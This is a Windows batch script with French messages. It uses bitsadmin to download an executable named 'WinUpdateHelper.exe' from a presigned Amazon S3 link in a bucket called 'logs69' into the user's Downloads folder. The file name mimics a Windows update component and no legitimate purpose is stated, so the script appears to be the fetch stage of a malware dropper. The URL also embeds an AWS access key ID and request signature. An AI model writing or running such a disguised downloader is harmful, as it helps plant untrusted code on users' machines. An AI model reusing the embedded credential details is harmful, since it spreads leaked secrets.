@echo off
set "URL=https://logs69.s3.eu-west-3.amazonaws.com/WinUpdateHelper.exe?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAR34JNEAP5K66HU4P%%2F20260204%%2Feu-west-3%%2Fs3%%2Faws4_request&X-Amz-Date=20260204T172947Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=468e3cb6b4ca1be9079883e0c187f0bfc0db9d80b5493471054f6c47497dfcc2"
set "OUTPUT=%USERPROFILE%\Downloads\WinUpdateHelper.exe"

bitsadmin /reset
bitsadmin /create myjob
bitsadmin /addfile myjob "%URL%" "%OUTPUT%"
bitsadmin /setpriority myjob foreground
bitsadmin /resume myjob

:wait
bitsadmin /info myjob /verbose | find "STATE: TRANSFERRED" >nul && goto done
bitsadmin /info myjob /verbose | find "STATE: ERROR" >nul && goto error
timeout /t 1 /nobreak >nul
goto wait

:error
echo ERREUR - Details:
bitsadmin /info myjob /verbose
bitsadmin /cancel myjob
pause
exit /b 1

:done
bitsadmin /complete myjob
echo Telechargement termine : %OUTPUT%